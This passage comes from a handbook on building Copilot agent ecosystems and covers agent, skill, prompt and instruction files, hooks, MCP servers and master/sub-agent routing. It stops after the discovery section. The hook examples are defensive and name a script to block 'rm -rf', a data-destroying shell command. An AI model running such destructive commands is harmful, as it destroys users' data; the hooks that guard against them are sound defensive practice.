# The Agent Authoring Handbook

> A two-part textbook for designing, building, and shipping multi-agent systems with
> GitHub Copilot — first as a vendor-neutral platform, then as deployed inside Intel's
> **Cth.ai** (Cheetah) ecosystem.
>
> **Audience:** engineers building **workspace-scoped** agent ecosystems — a `.github/`
> (or `autobots/`) folder that turns Copilot from a generic assistant into a domain
> expert with master/sub-agents, skills, prompts, instructions, hooks, and MCP
> integrations.
>
> **How to read this book:**
>
> - **Part A — GitHub Copilot Foundations** is the universal handbook. Read it
>   first, build your agents in your local `.github/` folder, and iterate until
>   they behave well in a stand-alone VS Code + Copilot setup.
> - **Part B — Intel Cth.ai Deployment** explains what changes when you take
>   those agents into Intel's CTH (Cheetah) Tool Flow Methodology: the
>   directory rename to `autobots/`, the **Cth.ai Constitution** that governs
>   MCP servers and agents, the `cth_psetup` lifecycle, CRT release flow, and
>   the `instructions.md` routing pattern. Apply Part B only after Part A is
>   working.
>
> **Recommended companion reading** before/while reading Part A:
>
> - [GeeksForGeeks — Building AI Agents](https://www.geeksforgeeks.org/artificial-intelligence/building-ai-agents/) — conceptual primer for newcomers to agent architecture.
> - [OpenAI — A Practical Guide to Building AI Agents](https://openai.com/business/guides-and-resources/a-practical-guide-to-building-ai-agents/) — vendor-agnostic patterns, design loops, and lifecycle diagrams.
> - [GitHub Copilot Customization Handbook (Copilot Academy)](https://copilot-academy.github.io/workshops/copilot-customization/copilot_customization_handbook) — the canonical reference; this Part A is structured around the same primitives.
> - [awesome-copilot](https://github.com/github/awesome-copilot) — community-maintained marketplace of prebuilt agents, skills, prompts, instructions, hooks, and plugins. Two notable agents: [devils-advocate](https://awesome-copilot.github.com/agents/#file=agents%2Fdevils-advocate.agent.md) and [principal-software-engineer](https://awesome-copilot.github.com/agents/#file=agents%2Fprincipal-software-engineer.agent.md).
> - [GitNexus](https://github.com/abhigyanpatwari/GitNexus) — client-side graph-RAG over a repo for code exploration; useful as a knowledge-graph backend for an agent.

---

## Table of Contents

Part A contents:

Start: [First 90 minutes to a useful agent](#start-here--first-90-minutes)
A1. [Mental model — what each primitive is for](#a1-mental-model)
A2. [The canonical `.github/` folder layout](#a2-the-canonical-github-folder-layout)
A3. [The primitives — one section each](#a3-the-primitives)
A3.1 [Agent instructions (`copilot-instructions.md` / `AGENTS.md`)](#a31-agent-instructions-always-on-base-layer)
A3.2 [File instructions (`*.instructions.md`)](#a32-file-instructions-instructionsmd)
A3.3 [Prompts (`*.prompt.md`)](#a33-prompts-promptmd)
A3.4 [Skills (`SKILL.md`)](#a34-skills-skillmd)
A3.5 [Custom agents (`*.agent.md`)](#a35-custom-agents-agentmd)
A3.6 [Hooks (`*.json` or inline)](#a36-hooks-deterministic-lifecycle-automation)
A3.7 [MCP servers (`.vscode/mcp.json`)](#a37-mcp-servers-vscodemcpjson)
A3.8 [Config files (your own YAML)](#a38-config-files-your-own-yaml)
A4. [The master/sub-agent pattern (incl. handoffs)](#a4-the-mastersub-agent-pattern)
A5. [Discovery & loading — how Copilot actually finds your stuff](#a5-discovery--loading)
A6. [Tooling — aliases, MCP scoping, allow/deny](#a6-tooling)
A7. [Tool permissions & security — blast radius, least privilege, MCP risks](#a7-tool-permissions--security)
A8. [YAML frontmatter cheat sheet](#a8-yaml-frontmatter-cheat-sheet)
A9. [Dos and Don'ts](#a9-dos-and-donts)
A10. [End-to-end worked example](#a10-end-to-end-worked-example)
A11. [Maintenance, versioning, testing](#a11-maintenance-versioning-testing)
A12. [Beyond the basics — plugins, agentic workflows, agentic memory](#a12-beyond-the-basics)
A13. [Appendix — Official documentation links](#a13-appendix)

Part B contents:

B1. [What changes inside Cth.ai (and what doesn't)](#b1-what-changes-inside-cthai)
B2. [Step 1 — Pre-flight & VS Code login (`cth_ai_setup`)](#b2-step-1--pre-flight)
B3. [Step 2 — Local sandbox & the `autobots/` directory contract](#b3-step-2--local-sandbox)
B4. [Step 3 — Python venv & the `autobots_sdk.pth` pattern](#b4-step-3--python-venv)
B5. [Step 4 — MCP servers the Cth.ai way (`AutobotsMCPStdioServer`)](#b5-step-4--mcp-servers)
B6. [Step 5 — Authoring agents & skills against the Cth.ai Constitution](#b6-step-5--authoring-against-the-constitution)
B7. [Step 6 — Local validation (`cth.ai inspect` / `cth.ai setup`)](#b7-step-6--local-validation)
B8. [Step 7 — Releasing your tool through CRT](#b8-step-7--release-through-crt)
B9. [Step 8 — `instructions.md` as the persona + routing layer](#b9-step-8--instructionsmd)
B10. [Cth.ai Constitution — Mandatory + Recommended checklists](#b10-cthai-constitution-checklists)
B11. [Cth.ai citation index — wiki page IDs](#b11-citation-index)

---

## Part A — GitHub Copilot Foundations

Part A is the universal handbook. It explains the seven Copilot customization primitives,
how they compose, and how a small `.github/` folder makes Copilot behave like a domain
expert. Every example here works on a stock VS Code + GitHub Copilot setup, no Intel
infrastructure required. Companion handbook: the
[Copilot Customization Handbook](https://copilot-academy.github.io/workshops/copilot-customization/copilot_customization_handbook).

---

## Start here — first 90 minutes

If you are the engineer opening this document for the first time, do not begin by
designing a full agent ecosystem. Build one thin vertical slice that proves discovery,
tool permissions, and user value.

### The first useful slice

Create exactly these files first:

```text
<repo-root>/
├── AGENTS.md
└── .github/
   ├── agents/
   │   ├── lead.agent.md
   │   └── researcher.agent.md
   ├── skills/
   │   └── repo-triage/
   │       └── SKILL.md
   └── instructions/
      └── repo-domain.instructions.md
```

Minimum behavior:

1. `AGENTS.md` gives only project-wide facts: stack, test command, architecture, and
  what not to touch.
2. `lead.agent.md` is the only visible agent. It classifies the user's request and
  delegates to `researcher` when the task is read-only exploration.
3. `researcher.agent.md` sets `user-invocable: false` and has only `read` plus `search`.
4. `repo-triage/SKILL.md` captures one reusable workflow, such as "find where this
  behavior is implemented and summarize relevant files."
5. `repo-domain.instructions.md` has a narrow `applyTo:` glob or a keyword-rich
  `description:`. Avoid `applyTo: "**"` until you can prove it is worth the context.

### Copy-paste starter stubs

`AGENTS.md`:

```markdown
# Repo Agent Context

- Stack: <language/framework/runtime>
- Install: <command>
- Test: <command>
- Lint: <command>
- Architecture: <2-5 bullets naming the important folders>
- Do not touch: <generated files, release outputs, secrets, vendor dirs>
- Primary agent: `lead`
```

`.github/agents/lead.agent.md`:

```markdown
---
name: lead
description: "Use for repo questions, feature triage, and safe routing to specialists. Trigger phrases: where is, how does, what tests, investigate, implement."
tools: [agent, read, search]
agents: [researcher]
---

You are the lead agent for this repo.

## Boundaries
- Prefer read-only inspection first.
- Ask before editing files or running commands.
- Delegate read-only exploration to `researcher` when the user asks where/how/why.

## Approach
1. Classify the user request.
2. Gather minimal context.
3. Delegate when a specialist can answer faster.
4. Return file paths, reasoning, and the next safe action.
```

`.github/agents/researcher.agent.md`:

```markdown
---
name: researcher
description: "Use for read-only codebase research: find implementations, map call flows, summarize files, identify tests."
tools: [read, search]
user-invocable: false
---

You are a read-only codebase researcher.

## Constraints
- Do not edit files.
- Do not run shell commands.
- Cite concrete file paths.

## Output Format
- Summary
- Relevant files
- Risks or unknowns
- Suggested next action
```

`.github/skills/repo-triage/SKILL.md`:

```markdown
---
name: repo-triage
description: "Use when locating behavior in the repo, mapping relevant files, or deciding which tests cover a change."
---

# Repo Triage

## Procedure
1. Search for the user's domain terms, function names, config keys, and UI labels.
2. Read the smallest set of files that explain the behavior.
3. Identify the natural test locations.
4. Return a concise map of files, behavior, and next step.
```

Definition of done for the first slice: the visible agent can answer a real repo question,
the hidden researcher is used when appropriate, the skill auto-loads when its description
matches, and no agent has `edit` or `execute` yet.

### First smoke test

Ask the visible agent three questions:

1. "What can you help with in this repo?"
2. "Find where `<real feature>` is implemented and summarize the files."
3. "What tests would you run before changing `<real feature>`?"

The slice is working only if the agent names relevant files, uses the subagent when it
should, avoids tools it does not need, and asks before edits.

### Start-here Do / Don't

| Do | Don't |
|---|---|
| Build one vertical slice before building a hierarchy. | Do not create ten agents before one agent has passed a smoke test. |
| Start read-only, then add `edit`, then add `execute` last. | Do not grant full workstation access because the future roadmap might need it. |
| Write the agent description using the words users will type. | Do not write descriptions like "helpful assistant" or "does repo things." |
| Keep examples real: use one known repo workflow and one known failure mode. | Do not test only with invented toy prompts. |

---

## A1. Mental model

There are **seven** customization primitives in a Copilot workspace. Pick the right one and the system stays small and discoverable; pick the wrong one and you'll fight discovery loops forever.

| Primitive | What it is | When it loads | Typical size |
|-----------|------------|---------------|--------------|
| **Agent instructions** | Always-on workspace rules | Every chat turn | <100 lines |
| **File instructions** | Rules attached to a topic or file pattern | When `applyTo` matches **or** the agent decides the description is relevant | <200 lines |
| **Prompts** | Reusable single-task templates | When user types `/name` | Short |
| **Skills** | Multi-step workflows + bundled assets (scripts, refs) | Slash command **or** model decides description matches | SKILL.md <500 lines; refs unlimited |
| **Custom agents** | A persona with its own tools, model, and body prompt | User picks from agent picker, or another agent calls it as a subagent | 50–300 lines |
| **Hooks** | Shell commands run at lifecycle events | Deterministic, on event | Small scripts |
| **MCP servers** | External tool/data providers (HSDES, wiki, GitHub, DBs, …) | Registered globally; tools surface via aliases | N/A |

**Mantra**: *Guidance is non-deterministic (LLM may use or ignore). Hooks are deterministic (they always run).*

### Decision flow

```
Need to add behavior to Copilot?
│
├── Should it run on EVERY turn?                → Agent instructions
├── Should it run when editing certain files?   → File instructions (applyTo)
├── Should the user type `/something` for it?   → Prompt (single task) OR Skill (multi-step + assets)
├── Need a different persona / tool set?        → Custom agent
├── Need GUARANTEED behavior at lifecycle?      → Hook
└── Need external data/tools (Jira, DB, API)?   → MCP server
```

### A1.1 Agent calibration: overfitting, underfitting, and capability locking

An agent is not a normal script. It is a **policy wrapper around an LLM**. The art is to
shape the model enough that it is reliable, but not so tightly that you destroy the
reasoning ability you wanted in the first place.

| Failure mode | What it looks like | Root cause | Fix |
|---|---|---|---|
| **Underfit agent** | Gives generic advice, ignores local conventions, forgets domain terms | Not enough domain context, vague persona, missing examples | Add concrete repo facts, trigger words, examples, and output format |
| **Overfit agent** | Refuses reasonable adjacent work, follows brittle scripts, asks needless questions | Too many hard rules, giant prompts, no room for judgment | Move detail into skills/references, keep constraints to true invariants |
| **Capability-locked agent** | Behaves like a checklist engine and stops using search, synthesis, or decomposition | Bad modeling: persona says "only do X" when the task requires exploration; tools are absent or over-restricted | Separate persona, workflow, and tool policy. Let the model reason inside clear boundaries |
| **Tool-overfit agent** | Always calls one MCP/tool even when reading files would answer faster | Prompt says "always use tool X" instead of "use when..." | Convert hard "always" into routing conditions |
| **Tool-underfit agent** | Answers from memory when a live wiki, HSD, or code search is required | Tool is missing, description does not mention source-of-truth behavior | Add scoped read tools and source-citation rules |

Bad modeling example, overfit and capability-locked:

```markdown
You are BuildAgent. Only follow these exact 37 steps. Never inspect files unless the
user provides a file path. Never use judgment. Always run the build script before
answering. If anything is missing, stop.
```

Why this fails: the agent cannot discover context, cannot adapt to a partial user prompt,
and may run expensive commands when a read-only answer would be enough.

Better modeling:

```markdown
You are BuildAgent, a build and test assistant for this repo.

## Boundaries
- Prefer read-only inspection first.
- Run commands only when the user asks for verification or when a change was made.
- Ask before destructive or long-running commands.

## Approach
1. Identify the build system from repo files.
2. Find the smallest relevant test/build command.
3. Explain what you will run, then run it if allowed.
4. Summarize failures with file paths and next action.
```

### A1 Do / Don't

| Do | Don't |
|---|---|
| Model the agent around intent, evidence, boundaries, and output. | Do not model the agent as a fragile macro recorder. |
| Use "prefer", "when", and "unless" for judgment-based guidance. | Do not use "always" and "never" unless violating the rule is truly unsafe. |
| Keep invariant policy in instructions, workflow in skills, and persona in agents. | Do not paste every rule into every agent body. |
| Test prompts just outside the agent's core lane to detect overfitting. | Do not judge quality only on the exact demo prompt you wrote the agent for. |

---

## A2. The canonical `.github/` folder layout

```
<repo-root>/
├── .github/
│   ├── copilot-instructions.md         # OR AGENTS.md (root) — never both
│   ├── agents/
│   │   ├── master-agent.agent.md       # the ONE user-facing agent
│   │   ├── researcher.agent.md         # user-invocable: false
│   │   ├── log-analyzer.agent.md       # user-invocable: false
│   │   └── ...
│   ├── instructions/
│   │   ├── domain-primer.instructions.md         # applyTo: '**'
│   │   ├── python-style.instructions.md          # applyTo: '**/*.py'
│   │   └── api-design.instructions.md            # description-only, on-demand
│   ├── prompts/
│   │   ├── summarize-ticket.prompt.md
│   │   └── generate-tests.prompt.md
│   ├── skills/
│   │   └── log-analysis/
│   │       ├── SKILL.md
│   │       ├── scripts/
│   │       │   └── parse-log.py
│   │       └── references/
│   │           └── signatures.md
│   ├── hooks/
│   │   └── block-dangerous-cmds.json
│   ├── scripts/                        # general project utilities
│   └── config/                         # YAML pointer files your agents read
│       ├── knowledge-base.yaml
│       ├── mcp-registry.yaml
│       └── domain-paths.yaml
├── .vscode/
│   └── mcp.json                        # MCP server registrations
└── AGENTS.md                           # OR put root project context here
```

**Rules of thumb:**

- Pick `AGENTS.md` *or* `copilot-instructions.md` — **not both**. `AGENTS.md` is the open standard supported by multiple tools; `copilot-instructions.md` is Copilot-specific. ([source](https://code.visualstudio.com/docs/copilot/customization/custom-instructions))
- Skills are **folders**, never single files. The folder name must equal the `name:` in `SKILL.md`.
- Anything an agent loads via a relative link should live **adjacent** to the agent file (`./scripts/`, `./references/`).
- Config files (your own YAML) are *not* a Copilot primitive — they're plain data files your agents read. Put them under `.github/config/` so they're co-located with the agents that consume them.

### A2 Do / Don't

| Do | Don't |
|---|---|
| Keep one obvious home for each primitive: agents in `agents/`, skills in `skills/`, prompts in `prompts/`. | Do not scatter agent assets across random repo folders and expect future maintainers to find them. |
| Put reusable data such as page IDs, paths, and tool registries in `.github/config/`. | Do not hard-code evolving domain facts into many agent bodies. |
| Co-locate helper scripts with the skill or hook that calls them. | Do not make a skill depend on scripts with unclear ownership. |
| Hide internal agents with `user-invocable: false`. | Do not let every implementation detail show up in the agent picker. |

---

## A3. The primitives

### A3.1 Agent instructions (always-on base layer)

The "system prompt" of your repo. Loaded into **every** chat turn.

**File:** `.github/copilot-instructions.md` **OR** `AGENTS.md` at the root.

**No frontmatter required.** Pure Markdown.

**Template:**

```markdown
# Project Guidelines

## Code Style
- Language: Python 3.11, type-hinted, ruff-formatted
- See `docs/STYLE.md` for the full guide

## Architecture
- `core/` — pure logic, no I/O
- `adapters/` — I/O wrappers
- `cli/` — Typer entry points

## Build and Test
- Install: `uv sync`
- Test:    `pytest -q`
- Lint:    `ruff check .`

## Conventions
- All new tools must register in `tools/registry.py`
- Never commit `.env` files
```

**Dos:**
- Keep it under ~100 lines. Every line costs context budget on every turn.
- Link to deeper docs (`See docs/TESTING.md`) instead of inlining them.
- Inline only **agent-critical gotchas** that aren't documented anywhere else.

**Don'ts:**
- Don't paste your README here.
- Don't include both `copilot-instructions.md` and `AGENTS.md` — pick one.
- Don't add obvious advice ("write clean code"). The model already knows.

---

### A3.2 File instructions (`*.instructions.md`)

Topic-scoped or file-scoped rules. **Two discovery modes:**

| Mode | Trigger | YAML key |
|------|---------|----------|
| Auto-attach | File path in context matches a glob | `applyTo: "**/*.py"` |
| On-demand | Agent decides description is relevant | `description: "Use when …"` |

**Location:** `.github/instructions/*.instructions.md`

**Frontmatter (full):**

```yaml
---
description: "Use when writing database migrations or schema changes. Covers safety, rollback, zero-downtime patterns."
name: "Database Migrations"   # optional, defaults to filename
applyTo: "**/migrations/**/*.py"  # optional
---
```

**`applyTo` patterns:**

```yaml
applyTo: "**"                        # ALWAYS load — use sparingly, costs context
applyTo: "**/*.py"                   # Python files only
applyTo: ["src/**", "lib/**"]        # Array (OR)
applyTo: "src/**, lib/**"            # Comma form (OR)
applyTo: "src/api/**/*.ts"           # Folder + extension
```

**Dos:**
- One concern per file (testing, styling, security, …).
- Keyword-rich descriptions starting with "Use when …" — that's how on-demand discovery works.
- Prefer narrow `applyTo` over `applyTo: "**"`.

**Don'ts:**
- Don't put on-demand instructions behind `applyTo: "**"` — it forces always-on loading.
- Don't duplicate rules already in agent instructions.

---

### A3.3 Prompts (`*.prompt.md`)

**Single-task** templates the user invokes with `/name` in chat.

**Location:** `.github/prompts/*.prompt.md`

**Frontmatter (full):**

```yaml
---
description: "Generate Pytest unit tests for the selected function"
name: "Generate Tests"             # optional
argument-hint: "Optional: edge cases to focus on"   # optional, shown in chat input
agent: "agent"                     # optional: ask | agent | plan | <custom-agent-name>
model: "Claude Sonnet 4.5 (copilot)"  # optional; supports fallback array
tools: [search, edit, read]        # optional; overrides agent's tools
---
```

**Body** — plain Markdown instructions to the agent. Use `[file](./relative/path.md)` for context references and `#tool:<toolname>` to reference specific tools.

**Tool priority** when both prompt and agent specify tools:
1. Prompt's `tools:`
2. Referenced agent's `tools:`
3. Default tools for selected agent

**Dos:**
- One task per prompt. "Generate tests" — good. "Generate tests and deploy" — bad.
- Provide output examples when format matters.
- Reference instruction files instead of duplicating their content.

**Don'ts:**
- Don't make prompts multi-turn workflows — that's what skills are for.
- Don't over-tool. If the prompt only needs `read`, don't give it `execute`.

---

### A3.4 Skills (`SKILL.md`)

Skills are **folders** with bundled assets — scripts, reference docs, templates. They appear as slash commands like prompts, but support multi-step workflows.

**Location:** `.github/skills/<skill-name>/SKILL.md`

**Folder structure:**

```
.github/skills/log-analysis/
├── SKILL.md                  # required, name MUST match folder
├── scripts/                  # executable code
│   └── parse.py
├── references/               # additional docs, loaded only when referenced
│   └── signatures.md
└── assets/                   # templates, boilerplate
    └── report-template.md
```

**Frontmatter (full):**

```yaml
---
name: log-analysis                # REQUIRED; 1-64 chars, lowercase alphanumeric + hyphens
                                  # MUST match folder name
description: 'Parse Conformal lec.log and Formality fm.log. Build milestone timeline. Use for FEV log triage.'
argument-hint: 'Path to log file' # optional
user-invocable: true              # optional; default true (show as slash command)
disable-model-invocation: false   # optional; default false (allow model auto-load)
---
```

**Body sections (recommended):**

```markdown
# Log Analysis Skill

## When to Use
- Triage failed FEV runs
- Correlate non-equiv to source RTL

## Procedure
1. Read the log at the provided path
2. Run [parse script](./scripts/parse.py) on it
3. Apply signature catalog from [references/signatures.md](./references/signatures.md)
4. Output structured JSON to user CWD

## Output Format
{exact schema}
```

**Progressive loading** (how Copilot saves context):
1. **Discovery** (~100 tokens): only `name` + `description`
2. **Instructions** (<5000 tokens): full `SKILL.md` body when relevant
3. **Resources**: `./scripts/`, `./references/` load only when referenced

**Slash + auto-invoke matrix:**

| `user-invocable` | `disable-model-invocation` | Slash command? | Auto-loaded? |
|------------------|---------------------------|---------------|--------------|
| `true` (default) | `false` (default)         | Yes           | Yes          |
| `false`          | `false`                   | No            | Yes          |
| `true`           | `true`                    | Yes           | No           |
| `false`          | `true`                    | No            | No (dead skill) |

**Dos:**
- Keep `SKILL.md` short; push detail into `references/`.
- Use relative paths only (`./scripts/x.py`), never absolute.
- Keep references one level deep from `SKILL.md`.

**Don'ts:**
- Don't mismatch folder name and `name:` field — discovery fails silently.
- Don't dump a monolithic 2000-line SKILL.md; use references.

---

### A3.5 Custom agents (`*.agent.md`)

Personas with their own model, tools, and body prompt. **This is where the master/sub-agent pattern lives.**

**Location:** `.github/agents/<name>.agent.md`

**Frontmatter (full):**

```yaml
---
description: "REQUIRED. Used by agent picker AND by subagent discovery. Keyword-rich."
name: "Pretty Name"             # optional, defaults to filename
tools: [search, web, hsdes/*]   # optional; aliases + MCP server scopes
model: "Claude Sonnet 4.5 (copilot)"        # optional; supports fallback array
argument-hint: "Describe the task..."        # optional
agents: [researcher, log-analyzer]           # optional; restrict callable subagents
                                             #   omit = all; [] = none
user-invocable: true             # optional; default true; FALSE hides from picker
disable-model-invocation: false  # optional; default false; TRUE prevents subagent invocation
handoffs: [other-agent]          # optional; declared transitions
hooks:                           # optional; inline lifecycle hooks (same schema as standalone)
  PreToolUse:
    - type: command
      command: "./scripts/validate.sh"
      timeout: 10
---
```

**Invocation control — the table that matters:**

| `user-invocable` | `disable-model-invocation` | Shows in picker? | Callable as subagent? |
|------------------|---------------------------|-----------------|----------------------|
| `true` (default) | `false` (default)         | ✅              | ✅                   |
| **`false`**      | `false`                   | ❌              | ✅                   |
| `true`           | `true`                    | ✅              | ❌                   |
| `false`          | `true`                    | ❌              | ❌ (dead agent)      |

**Model fallback:**

```yaml
model: ['Claude Sonnet 4.5 (copilot)', 'GPT-5 (copilot)', 'Claude Opus 4.7 (copilot)']
```

The first available model wins.

**Body — what to write:**

```markdown
You are **{Persona Name}**, a specialist in {one domain}.

## Constraints
- DO NOT do {out of scope thing}
- ONLY {the one thing this agent does}

## Approach
1. Step one
2. Step two
3. Step three

## Output Format
{exact schema the caller expects}
```

**Dos:**
- One persona = one role. Resist swiss-army agents.
- Minimal tool list. Excess tools dilute focus and waste context.
- Description must include trigger keywords (the parent agent matches them).
- For subagents: define `## Output Format` precisely — the parent only sees the final message.

**Don'ts:**
- Don't have circular handoffs (A→B→A with no progress).
- Don't have a vague description like "A helpful agent." Discovery dies.
- Don't expose every subagent in the picker — set `user-invocable: false`.

---

### A3.6 Hooks (deterministic lifecycle automation)

Hooks are shell commands that **always** run at lifecycle events. Use them when guidance isn't enough.

**Locations:**

| Path | Scope |
|------|-------|
| `.github/hooks/*.json` | Workspace (team-shared, committed) |
| `.claude/settings.local.json` | Workspace local (not committed) |
| `.claude/settings.json` | Workspace |
| `~/.claude/settings.json` | User profile |

**Hook events:**

| Event | Fires when… |
|-------|-------------|
| `SessionStart` | First prompt of new session |
| `UserPromptSubmit` | User submits a prompt |
| `PreToolUse` | Before a tool call |
| `PostToolUse` | After a successful tool call |
| `PreCompact` | Before context compaction |
| `SubagentStart` | Subagent starts |
| `SubagentStop` | Subagent ends |
| `Stop` | Session ends |

**Standalone hook file** (`.github/hooks/policy.json`):

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "type": "command",
        "command": "./scripts/block-dangerous.sh",
        "timeout": 15,
        "windows": "scripts\\block-dangerous.ps1"
      }
    ]
  }
}
```

**Inline in an agent** (same schema, scoped to that agent):

```yaml
---
description: "Secure code reviewer"
hooks:
  PreToolUse:
    - type: command
      command: "./scripts/block-rm-rf.sh"
  PostToolUse:
    - type: command
      command: "./scripts/auto-lint.sh"
---
```

**I/O contract:**
- Hooks read JSON from stdin, write JSON to stdout.
- Exit `0` = success; exit `2` = blocking error; other = non-blocking warning.
- `PreToolUse` can return `{"hookSpecificOutput": {"permissionDecision": "allow|ask|deny"}}`.

**Dos:**
- Use hooks for **guaranteed** behavior (block `rm -rf`, force linting, inject context).
- Keep hooks fast (<1s) — they block the agent loop.
- Validate hook inputs as if they're untrusted.

**Don'ts:**
- Don't use hooks for things instructions can handle.
- Don't hardcode secrets in hook scripts.
- Don't let agents edit hook scripts without review.

---

### A3.7 MCP servers (`.vscode/mcp.json`)

MCP (Model Context Protocol) servers expose **external tools and data** (databases, APIs, ticketing systems, wikis) as tools the agent can call.

**Registration:** `.vscode/mcp.json`

```json
{
  "servers": {
    "hsdes": {
      "command": "${workspaceFolder}/.venv/bin/python",
      "args": ["${workspaceFolder}/third_party/mcp-suite/tools/mcp-hsd/server.py"],
      "env": {}
    },
    "wiki-jira-mcp": {
      "url": "https://internal-mcp.example.com/sse"
    }
  }
}
```

**Tool surfacing:**
- Each MCP tool appears as `mcp_<server>_<toolname>` (e.g. `mcp_hsdes_get_hsd_article`).
- In agent frontmatter, scope with `<server>/*`:
  ```yaml
  tools: [hsdes/*, wiki-jira-mcp/confluence_search, search, read]
  ```
- Some MCPs use the in-server `@mcp.tool` decorator to expose "AI skills" (server-side reasoning), distinct from wheel-packaged skills.

**Dos:**
- Document which MCPs your repo expects in `AGENTS.md` and a `config/mcp-registry.yaml`.
- Have agents emit a one-line capability summary on their first turn.
- Pin MCP versions when reproducibility matters.

**Don'ts:**
- Don't assume an MCP is loaded — check with `tool_search` first if it's a deferred tool.
- Don't expose write-capable MCP tools to read-only research agents.

---

### A3.8 Config files (your own YAML)

Not a Copilot primitive — just **plain data files** your agents read at runtime to stay pluggable.

**Common patterns:**

```
.github/config/
├── knowledge-base.yaml      # canonical page IDs, URLs, tags
├── mcp-registry.yaml        # capability descriptions for the discovery skill
├── domain-paths.yaml        # ward layout, environment vars, terminology
└── log-signatures.yaml      # regex catalog the log-analyzer agent extends
```

**Why use config files:**
- Agents and instruction files **reference** them instead of hard-coding.
- When the domain evolves, users edit YAML — not Markdown prompts.
- One source of truth across many agents.

**Convention:** Reference them from `AGENTS.md` and instructions so the agent knows where to look.

### A3 Do / Don't

| Do | Don't |
|---|---|
| Choose the smallest primitive that solves the problem. | Do not turn every reusable task into a custom agent. |
| Put deterministic enforcement in hooks and advisory guidance in instructions. | Do not expect an instruction file to reliably block dangerous behavior. |
| Use skills for multi-step workflows with assets, scripts, or deep references. | Do not overload prompts with long procedures and hidden dependencies. |
| Scope MCP access at the agent that needs it. | Do not grant every agent every server because one workflow uses one tool. |

---

## A4. The master/sub-agent pattern

The pattern your workspace already implements:

```
┌────────────────────────────────────────────┐
│            User (VS Code chat)             │
└────────────────┬───────────────────────────┘
                 │
                 ▼
   ┌─────────────────────────────┐
   │   master-agent              │  user-invocable: true
   │   (the ONE visible agent)   │  agents: [r1, r2, r3]
   └──┬──────┬──────┬────────────┘
      │      │      │  runSubagent(name, prompt)
      ▼      ▼      ▼
   ┌───┐  ┌───┐  ┌───┐
   │ r1 │  │ r2 │  │ r3 │   all: user-invocable: false
   └───┘  └───┘  └───┘
```

### Recipe

1. **Master agent** — visible, broad description, tool list includes `agent` alias so it can call subagents. Its body is an **orchestrator**: classify intent → pick subagent → stitch results.
2. **Subagents** — `user-invocable: false`. Narrow, role-specific. Each has its own minimal tool set. Each defines an `## Output Format`.
3. **`agents:` allow-list (optional)** — on the master agent, restrict which subagents it can call (defense in depth).
4. **Subagent descriptions are matchers** — the master agent picks subagents by the keyword overlap between user intent and each subagent's `description:`. Write descriptions like indexed search terms, not marketing copy.
5. **Subagents are stateless** — they get one prompt, return one result. They can't talk back. Design the master's prompt accordingly: ship everything they need, ask for everything you want.

### Master agent body — minimal scaffold

```markdown
You are **Master-Agent**, entry point for {domain}.

## On the first turn
Greet the user. Show the menu of capabilities. Wait.

## On every turn
1. Classify intent.
2. Announce which subagent will handle it.
3. Call `runSubagent(name="<subagent>", prompt="<scoped task>")`.
4. Cite results and ask the user the next question.

## Available subagents
- `researcher` — wiki/Jira BKM lookup, when user says "find docs / BKM / how-to"
- `log-analyzer` — log triage, when user says "log / failure / abort / error"
- `db-explorer` — schema/data, when user says "schema / table / query"

## Rules
- Cite real sources (URLs, ticket IDs, file paths).
- Ask before destructive actions.
```

### When **not** to split into subagents

- One person, one task, one tool set — keep it in the master.
- The "subagent" needs to converse back-and-forth — subagents can't; use handoffs or skills.
- You're just trying to organize prompts — use **skills** or **instructions** instead.

### Subagents and the other primitives — what's actually shared

A common misconception is that subagents *own* prompts and skills. They don't. Subagents are
just `.agent.md` files with `user-invocable: false`. Prompts, skills, and instructions are
**workspace-wide resources**; agents pull them in via the same description-matching mechanism
the master uses. Here's the precise truth table:

| Resource | Inside a running subagent? | How |
|----------|---------------------------|-----|
| **File instructions** (`*.instructions.md`) | ✅ Yes | Auto-attach via `applyTo` (if a matching file is in the subagent's context) or model auto-load when description matches the current task. |
| **Skills** (`SKILL.md`) | ✅ Yes | Model auto-loads when the skill's `description` matches the subagent's current task. Requires `disable-model-invocation` to be unset / `false`. The subagent must also have whatever tools the skill's procedure needs (`execute`, `edit`, etc.). |
| **Prompts** (`*.prompt.md`) | ❌ No | Prompts are **user-only**. A subagent has no user typing `/`. The prompt's `agent:` frontmatter selects which agent kind runs the prompt **when the user fires it from chat**. If you want a subagent to follow a reusable script, put it in a **skill** instead, or include the steps inline in the master's `runSubagent` call. |
| **Other custom agents** | ✅ Yes | Subagent calls them via `runSubagent` (the `agent` tool alias) — subject to the parent's `agents: […]` allow-list, if any. |
| **Hooks** | ✅ Always | Hooks are deterministic — they fire on lifecycle events regardless of which agent is active. Inline `hooks:` on a subagent only fire while *that* subagent is running. |
| **MCP tools** | ✅ Yes | Subject to the subagent's own `tools:` declaration (e.g. `tools: [hsdes/*]`). |

**Practical consequence for design:**
- Reusable procedures → **skill** (callable by any agent automatically).
- One-shot user-facing task → **prompt**.
- Per-role tool restrictions → **subagent**.

### A4 Do / Don't

| Do | Don't |
|---|---|
| Make the master agent a router and synthesizer. | Do not make the master agent also be every specialist. |
| Give each subagent one role, one tool budget, and one output contract. | Do not create overlapping subagents that all answer the same trigger phrases. |
| Treat the master agent's effective power as the union of callable subagents. | Do not audit only the master's own `tools:` list. |
| Use handoffs when a human should approve a role transition. | Do not use autonomous subagent calls for steps that require user consent. |

---

## A5. Discovery & loading

How Copilot finds your stuff (most-to-least common failure mode):

| Primitive | Discovery mechanism |
|-----------|---------------------|
| Agent instructions | Always loaded (first 200 lines into context) |
| File instructions w/ `applyTo` | Loaded when matching file is in context |
| File instructions w/ description only | Agent reads description, decides to load body |
| Prompts | User types `/` in chat |
| Skills | User types `/` **and** model auto-load (if both enabled) |
| Custom agents (picker) | User opens agent picker; `user-invocable: false` hides them |
| Custom agents (subagent) | Parent agent matches `description:`; needs `agent` tool alias |
| Hooks | Lifecycle event fires; no discovery — always run |
| MCP tools | Registered server; tools surface via aliases; may be **deferred** |

**The #1 reason your customization isn't being used: the `description:` field doesn't contain the keywords the user (or parent agent) is searching for.** Write descriptions like search-engine bait.

**The #2 reason: filename, folder name, or `name:` field mismatch.** Skills especially — the folder name must equal `name:`.

### A5 Do / Don't

| Do | Don't |
|---|---|
| Put realistic trigger words in every `description:`. | Do not rely on the filename alone for discovery. |
| Smoke-test discovery with user phrases, acronyms, and misspellings from real work. | Do not test only with the exact wording in your description. |
| Keep auto-loaded instructions narrow. | Do not use `applyTo: "**"` as a substitute for good descriptions. |
| Verify that hidden subagents are still callable by the parent. | Do not set `disable-model-invocation: true` on a subagent unless you mean to block it. |

---

